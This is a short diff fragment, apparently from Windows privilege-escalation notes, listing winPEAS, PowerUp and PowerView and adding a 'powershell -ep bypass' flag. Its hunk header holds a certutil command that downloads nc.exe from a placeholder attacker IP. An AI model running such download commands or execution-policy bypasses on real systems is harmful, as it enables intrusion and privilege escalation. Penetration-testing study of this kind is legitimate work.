@@ -14,7 +14,7 @@ certutil -urlcache -split -f http://<attacker-ip>/nc.exe nc.exe
 
 winPEAS.exe
 
-PowerUp.ps1
+PowerUp.ps1 -- powershell -ep bypass
 
 PowerView.ps1
 
